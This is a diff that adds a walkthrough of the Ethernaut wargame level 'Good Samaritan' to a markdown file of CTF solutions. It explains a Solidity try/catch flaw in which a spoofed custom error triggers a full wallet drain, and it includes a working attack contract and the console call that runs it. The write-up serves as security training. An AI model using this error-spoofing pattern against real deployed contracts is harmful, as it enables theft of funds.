@@ -1668,3 +1668,97 @@ At this point, the player is the **admin** of the proxy, and they can control th
 ### Level Completed
 ![Level Complete Output](assets/puzzlewallet1.png)
 ![2](assets/puzzlewallet2.png)
+
+
+# Ethernaut Level 24: Good Samaritan
+
+### Strategy
+
+This challenge exploits **custom error handling and `try/catch` mechanics in Solidity 0.8+**. 
+
+The key vulnerability lies in the `GoodSamaritan.requestDonation()` function, which **only triggers the full wallet drain (`transferRemainder`) if a specific error `NotEnoughBalance()` is thrown.**
+
+We can abuse this logic by **pretending to receive the donation**, and **reverting with the correct error signature (`NotEnoughBalance()`)** during the callback. This tricks the contract into calling `wallet.transferRemainder()` and draining the entire wallet into our contract.
+
+---
+
+### Vulnerability
+
+```solidity
+catch (bytes memory err) {
+    if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
+        wallet.transferRemainder(msg.sender);
+    }
+}
+```
+
+This code **blindly matches error messages** and doesn’t care *who* sent them. If we revert with the same error during a `notify()` callback, it will **assume the wallet is empty and transfer everything** to us.
+
+---
+
+### Exploit Steps
+
+#### 1. Understand the flow
+
+- `requestDonation()` tries to send you 10 coins using `wallet.donate10(msg.sender)`.
+- If you're a **contract**, `Coin.transfer()` will **call your `notify()` function**.
+- If your `notify()` throws the **`NotEnoughBalance()`** error, it triggers a catch block which **transfers the wallet's remaining coins to you**.
+
+---
+
+#### 2. Deploy the Attack Contract
+
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.0;
+
+interface IGoodSamaritan {
+  function requestDonation() external returns (bool enoughBalance);
+}
+
+contract Attack {
+  // Must match the Wallet's custom error
+  error NotEnoughBalance();
+
+  // Call the vulnerable function
+  function pwn(address _addr) external {
+    IGoodSamaritan(_addr).requestDonation();
+  }
+
+  // This function gets called during the donation
+  function notify(uint256 amount) external pure {
+    if (amount == 10) {
+        revert NotEnoughBalance(); // Trigger catch block in GoodSamaritan
+    }
+  }
+}
+```
+
+---
+
+#### 3. Execute the Attack
+
+In Remix or your console:
+
+```js
+await attack.pwn("INSTANCE_ADDRESS_HERE")
+```
+
+This will:
+- Trigger `requestDonation()`
+- Call `donate10()`
+- Inside `transfer()`, call your `notify()` function
+- `notify()` reverts with `NotEnoughBalance()`
+- The error gets caught by the catch block
+- Wallet sends **all** its remaining balance to you!
+
+### Concepts Used
+- Custom Errors (`error NotEnoughBalance()`)
+- `try/catch` with `bytes memory err`
+- ABI error signature matching
+- ERC-20 token callback via `notify()`
+
+---
+
+### Level Completed
+![Level Complete Output](assets/goodsamaritan.png)
